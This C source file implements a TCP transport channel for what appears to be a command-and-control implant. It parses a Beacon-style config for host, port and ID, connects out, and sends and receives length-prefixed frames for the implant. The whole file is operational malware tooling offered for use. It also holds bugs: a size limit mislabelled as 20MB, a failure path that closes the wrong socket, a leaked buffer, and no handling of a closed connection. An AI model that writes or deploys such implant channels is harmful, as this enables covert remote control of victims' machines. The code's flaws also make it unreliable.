#include "channel.h"

#ifdef _DEBUG
#define DBG_PRINTF( x, ... ) dprintf( "[TCP CHANNEL]: " x, ##__VA_ARGS__ )
#else
#define DBG_PRINTF( x, ... )
#endif

BOOL TcpSend( CHANNEL_CONTEXT* Context, CONST CHAR* Data, DWORD Size, BOOL Register ) {
    CHAR* Frame     = NULL;
    DWORD FrameSize = sizeof( DWORD ) + Size;
    BOOL  Status    = FALSE;
    DWORD Total     = 0;
    INT   BytesSent = 0;

    if (!( Frame = (CHAR*)RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, FrameSize ) )) {
        return FALSE;
    }

    *(DWORD*)Frame = htonl( Size );
    memcpy( Frame + sizeof( DWORD ), Data, Size );

    while (Total < FrameSize) {
        if (( BytesSent = send( Context->Socket, Frame + Total, FrameSize - Total, 0 ) ) ==
            SOCKET_ERROR) {
            DBG_PRINTF( "send failed ( %d )\n", WSAGetLastError() );
            goto Cleanup;
        }

        Total += BytesSent;
    }

    Status = TRUE;

Cleanup:
    if (Frame)
        RtlFreeHeap( GetProcessHeap(), 0, Frame );
    return Status;
}

BOOL TcpReceive( CHANNEL_CONTEXT* Context, CHAR** Data, DWORD* Size ) {
    CHAR* Frame         = NULL;
    DWORD FrameSize     = 0;
    INT   BytesRead     = 0;
    DWORD Total         = 0;
    INT   BytesReceived = 0;

    if (( BytesRead = recv( Context->Socket, (CHAR*)&FrameSize, 4, 0 ) ) == SOCKET_ERROR) {
        DBG_PRINTF( "recv failed ( %d )\n", WSAGetLastError() );
        return FALSE;
    }

    if (BytesRead < 4) {
        DBG_PRINTF( "failed to read frame header\n" );
        return FALSE;
    }

    FrameSize = ntohl( FrameSize );
    if (FrameSize > ( 4096 * 5 )) { // 20MB
        return FALSE;
    }

    if (( Frame = (CHAR*)RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, FrameSize + 1 ) ) ==
        NULL) {
        DBG_PRINTF( "failed to allcoate frame\n" );
        return FALSE;
    }

    while (Total < FrameSize) {
        if (( BytesReceived = recv( Context->Socket, Frame + Total, FrameSize - Total, 0 ) ) ==
            SOCKET_ERROR) {
            DBG_PRINTF( "recv failed ( %d )\n", WSAGetLastError() );
            return FALSE;
        }

        Total += BytesReceived;
    }

    *Data = Frame;
    *Size = FrameSize;
    return TRUE;
}

BOOL TcpInitialize( CHANNEL_CONTEXT* Context ) {
    struct sockaddr_in Addr;
    SOCKET             Socket;
    WSADATA            WSAData;
    DWORD              dwMode;

    if (WSAStartup( MAKEWORD( 2, 2 ), &WSAData ) != 0) {
        DBG_PRINTF( "WSAStartup failed: ( %d )\n", WSAGetLastError() );
        return FALSE;
    }

    Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
    if (Socket == INVALID_SOCKET) {
        DBG_PRINTF( "socket failed: ( %d )\n", WSAGetLastError() );
        goto FAILED;
    }

    Addr.sin_family = AF_INET;
    Addr.sin_port   = htons( Context->Config.Port );
    if (inet_pton( AF_INET, Context->Config.Host, &Addr.sin_addr ) <= 0) {
        DBG_PRINTF( "inet_pton failed: ( %d )\n", WSAGetLastError() );
        goto FAILED;
    }

    if (connect( Socket, (struct sockaddr*)&Addr, sizeof( Addr ) ) == SOCKET_ERROR) {
        DBG_PRINTF( "connect failed: ( %d )\n", WSAGetLastError() );
        goto FAILED;
    }

    dwMode = 1;
    if (ioctlsocket( Socket, FIONBIO, &dwMode ) != NO_ERROR) {
        DBG_PRINTF( "ioctlsocket failed: ( %d )\n", WSAGetLastError() );
        goto FAILED;
    }

    Context->Socket  = Socket;
    Context->WSAData = WSAData;
    return TRUE;

FAILED:
    if (Socket != INVALID_SOCKET)
        closesocket( Context->Socket );
    WSACleanup();
    return FALSE;
}

BOOL TcpCleanup( CHANNEL_CONTEXT* Context ) {
    if (Context->Socket && Context->Socket != INVALID_SOCKET)
        closesocket( Context->Socket );

    WSACleanup();
    RtlFreeHeap( GetProcessHeap(), 0, Context );
    return TRUE;
}

BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) {
    datap            Parser;
    CHANNEL_CONTEXT* Context = NULL;

    Context = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL_CONTEXT ) );
    if (Context == NULL) {
        return FALSE;
    }

    DBG_PRINTF( "config: %p\n", Config );

    Implant->BeaconDataParse( &Parser, Config, ConfigSize );
    Context->Config.ID   = Implant->BeaconDataInt( &Parser );
    Context->Config.Host = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
    Context->Config.Port = Implant->BeaconDataShort( &Parser );

    DBG_PRINTF( "id.............: %d", Context->Config.ID );
    DBG_PRINTF( "host...........: %s", Context->Config.Host );
    DBG_PRINTF( "port...........: %d", Context->Config.Port );

    Channel->ID          = Context->Config.ID;
    Channel->Initialize  = TcpInitialize;
    Channel->Send        = TcpSend;
    Channel->Receive     = TcpReceive;
    Channel->Cleanup     = TcpCleanup;
    Channel->Context     = Context;
    Channel->ContextSize = sizeof( CHANNEL_CONTEXT );

    DBG_PRINTF( "channel %X registred\n", Context->Config.ID );

    return TRUE;
}
